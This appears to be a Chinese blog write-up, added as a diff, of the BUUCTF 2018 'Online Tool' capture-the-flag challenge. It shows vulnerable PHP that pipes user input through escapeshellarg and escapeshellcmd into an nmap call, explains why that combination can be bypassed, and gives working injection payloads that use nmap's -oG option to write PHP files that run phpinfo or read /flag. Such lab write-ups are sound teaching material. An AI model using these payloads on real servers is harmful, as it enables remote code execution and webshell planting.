@@ -1,0 +1,50 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-light" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<h1><a id="buuctfBUUCTF_2018Online_Tool_0"></a>buuctf-[BUUCTF 2018]Online Tool（小宇特详解）</h1>
+<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>
+    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>这里的escapeshellarg作用是：1,确保用户值传递一个参数给命令2,用户不能指定更多的参数3,用户不能执行不同的命令</p>
+<p>escapeshellcmd的作用是：1,确保用户只执行一个命令2,用户可以指定不限数量的参数3,用户不能执行不同的命令</p>
+<p>我们通过get方式进行对host的传参</p>
+<p>这里需要我们构造能够得到flag的host语句</p>
+<p>这里查看RCE漏洞的原理</p>
+<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
+<p>用我的话来说</p>
+<p>escapeshellarg处理后先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p>
+<p>127.0.0.1’ -oG经过 escapeshellarg处理后就变成了<code>'127.0.0.1'\'' -oG '</code> 也就是发现单引号进行转义，且以它为中心分割为三部分（在两边加单引号） 。</p>
+<p>随后在进经过escapeshellcmd 时变成：<code>'127.0.0.1'\\'' -oG \'</code>也就是将不成对的单引号及任意<code>\</code>进行添加<code>\</code>的操作。</p>
+<p>而此时我们想得到shell需要写入一个shell文件我们想要正常执行<code>&lt;?php phpinfo(); ?&gt; -oG 1.php</code>但是经过上面的函数处理后变成了一个被单引号包围的字符串，不会当命令去执行，这里我们需要闭合一个单引号。</p>
+<p>nmap有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>所以我们可以控制自己的输入写入文件，这里我们可以写入一句话木马链接，也可以直接命令 cat flag</p>
+<p>查看phpinfo()</p>
+<pre><code>?host=' &lt;?php echo phpinfo();?&gt; -oG 1.php '
+</code></pre>
+<p>查看flag</p>
+<pre><code>?host=' &lt;?php echo `cat /flag`;?&gt; -oG test.php '
+</code></pre>
+<p>这里注意用反引号cat /flag</p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
